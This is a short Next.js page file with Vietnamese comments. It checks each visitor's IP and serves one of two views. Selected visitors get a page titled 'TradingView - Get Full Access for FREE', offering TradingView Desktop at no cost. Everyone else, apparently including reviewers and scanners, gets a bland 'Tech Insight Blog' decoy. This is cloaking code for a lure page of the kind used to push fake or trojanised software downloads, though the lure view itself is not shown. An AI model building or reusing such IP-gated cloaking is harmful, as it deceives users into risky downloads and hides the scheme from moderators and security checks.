import ViewOne from "@/app/view-one";
import ViewTwo from "@/app/view-two";
import type { Metadata } from "next";
import { headers } from "next/headers";
import { analyzeIpAccess } from "@/lib/ip-analysis";

// Function chung để kiểm tra điều kiện (dùng cho cả metadata và component)
async function checkCondition(): Promise<boolean> {
  try {
    const headersList = await headers();
    return await analyzeIpAccess(headersList);
  } catch (error) {
    console.error("Error in checkCondition:", error);
    return false; // Fail-safe: có lỗi → không cho phép
  }
}

// Function để tạo metadata động dựa trên điều kiện
export async function generateMetadata(): Promise<Metadata> {
  const isConditionMet = await checkCondition();

  if (isConditionMet) {
    return {
      title: "TradingView - Get Full Access for FREE",
      description: "Get Full Access to TradingView Desktop for FREE. Experience extra power, extra speed and extra flexibility.",
    };
  } else {
    return {
      title: "Tech Insight Blog - Alternative View",
      description: "Tech Insight Blog alternative view",
    };
  }
}

export default async function Home() {
  const isConditionMet = await checkCondition();

  return (
    <div className="min-h-screen flex flex-col">
      <main className="overflow-hidden">
        {isConditionMet ? <ViewOne /> : <ViewTwo />}
      </main>
    </div>
  );
}
